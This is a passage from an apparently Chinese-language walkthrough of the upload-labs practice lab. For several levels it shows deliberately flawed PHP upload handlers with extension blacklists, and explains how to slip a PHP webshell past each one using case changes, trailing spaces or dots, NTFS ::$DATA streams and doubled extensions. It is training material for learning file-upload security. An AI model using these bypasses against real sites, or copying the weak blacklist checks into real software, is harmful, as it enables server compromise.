class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre></div><h3 id="大小写绕过黑名单"><a href="#大小写绕过黑名单" class="headerlink" title="大小写绕过黑名单"></a>大小写绕过黑名单</h3><p>本题没有使用”strtolower”进行大小写转换,所以将a.php改为a.Php,上传webshell即可</p><br><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><blockquote><p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre></div><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>本题没有使用”trim”进行删除文件名的前后空格,所以可以使用空格进行绕过</p><h3 id="抓取数据包并修改数据-1"><a href="#抓取数据包并修改数据-1" class="headerlink" title="抓取数据包并修改数据"></a>抓取数据包并修改数据</h3><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-07Burp%E6%8A%93%E5%8C%85.png"></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>本题环境适用在Windows环境下,Linux可能无法能正确访问最终结果,在Windows下使用空格命名,Windows会自动删除空格</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Windows%E4%BD%BF%E7%94%A8%E7%A9%BA%E6%A0%BC%E5%91%BD%E5%90%8D.gif"></p><br><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><blockquote><p>本pass禁止上传所有可以解析的后缀！</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre></div><h3 id="句号-绕过"><a href="#句号-绕过" class="headerlink" title="句号(.)绕过"></a>句号(.)绕过</h3><p>本题没有使用”deldot”进行删除文件名末尾的句号,所以可以使用句号进行绕过</p><h3 id="抓取数据包并修改数据-2"><a href="#抓取数据包并修改数据-2" class="headerlink" title="抓取数据包并修改数据"></a>抓取数据包并修改数据</h3><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-08Burp%E6%8A%93%E5%8C%85.png"></p><h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><p>本题环境适用在Windows环境下,Linux可能无法能正确访问最终结果,在Windows下使用句号命名,Windows会自动删除句号,注意是英文状态下的句号,本题方法与第七题大同小异</p><br><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><blockquote><p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre></div><blockquote><p>NTFS文件系统的ADS:<a href="https://www.qingsword.com/qing/812.html">https://www.qingsword.com/qing/812.html</a></p></blockquote><h3 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h3><p>没有对<code>::$DATA</code>进行过滤,所以可以通过::$DATA进行绕过</p><h3 id="抓取数据包并修改数据-3"><a href="#抓取数据包并修改数据-3" class="headerlink" title="抓取数据包并修改数据"></a>抓取数据包并修改数据</h3><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-09burp%E6%8A%93%E5%8C%85.png"></p><h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><div class="code-wrapper"><pre><code class="hljs hrml">访问的时候将会出现403的情况,只要将Url的::$data去掉即可(上传的文件名字不存在::$data)原Url:http://192.168.78.101/upload/upload/202007191638081519.php::$data新Url:http://192.168.78.101/upload/upload/202007191638081519.php</code></pre></div><h3 id="注意-2"><a href="#注意-2" class="headerlink" title="注意"></a>注意</h3><p>本题环境适用在Windows环境且文件系统是NTFS下,Linux可能无法能正确访问最终结果,在Windows的NTFS文件系统有一个特性,NTFS文件系统的数据存储$DATA数据流,我们写的例子是<code>“a.php”</code>，我们在实际写入的是<code>a.php::$DATA</code>(数据流名称为空,两个冒号之间为名称位置)</p><br><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><blockquote><p>本pass只允许上传.jpg|.png|.gif后缀的文件！</p></blockquote><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash">is_upload = <span class="hljs-literal">false</span>;</span><span class="hljs-meta">$</span><span class="bash">msg = null;</span>if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;</code></pre></div><h3 id="利用-句号-空格-句号-绕过"><a href="#利用-句号-空格-句号-绕过" class="headerlink" title="利用. .(句号 空格 句号)绕过"></a>利用<code>. .</code>(句号 空格 句号)绕过</h3><p>虽然题目代码进行了”deldot”和”trim”对文件名结尾做了过滤,但是由于只执行一次,所以配合<code>. .</code>上传过滤后,Url解析变成了Pass-08一样,文件后缀变成<code>.php.</code></p><h3 id="抓取数据包并修改数据-4"><a href="#抓取数据包并修改数据-4" class="headerlink" title="抓取数据包并修改数据"></a>抓取数据包并修改数据</h3><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-10Burp%E6%8A%93%E5%8C%85.png"></p><br><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><blockquote><p>本pass会从文件名中去除.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess字符！</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;                <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre></div><h3 id="双写后缀进行绕过"><a href="#双写后缀进行绕过" class="headerlink" title="双写后缀进行绕过"></a>双写后缀进行绕过</h3><p>本题核心代码为</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);</code></pre></div><p>且代码只会执行一次,所以可以进行双写来绕过第一次替换,比如<code>&quot;.pphphp&quot;</code>,经过程序执行后,将变为<code>.php</code></p><h3 id="抓取数据包并修改数据-5"><a href="#抓取数据包并修改数据-5" class="headerlink" title="抓取数据包并修改数据"></a>抓取数据包并修改数据</h3><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-11Burp%E6%8A%93%E5%8C%85.png"></p><br><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><blockquote><p>本pass上传路径可控！</p></blockquote><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;    <span class="hljs-variable">$ext_arr</span> = <span 